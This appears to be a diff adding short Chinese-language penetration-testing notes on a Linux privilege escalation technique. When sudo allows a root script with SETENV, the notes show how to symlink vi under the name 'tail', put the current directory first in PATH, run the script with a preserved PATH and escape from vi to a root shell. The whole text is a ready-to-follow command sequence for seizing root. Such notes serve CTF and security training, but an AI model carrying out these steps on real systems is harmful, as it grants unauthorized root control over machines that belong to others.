@@ -1,0 +1,12 @@
+当使用sudo -l时看见
+(root:root) SETENV: /usr/bin/check_syslog.sh(某个.sh脚本时)
+使用cat 出现
+#!/bin/bash/时可以使用提权
+
+1，ln -s /bin/vi tail 建立软连接
+2，ls -liah 查看是否建立软连接
+3,export PATH=.:$PATH 
+4,echo $PATH 查看环境变量是否将当前目录放在最前面
+5，sudo --preserve-env=PATH /usr/bin/check_syslog.sh 
+6，当成功打开文件之后使用:!bash启动root对话
+
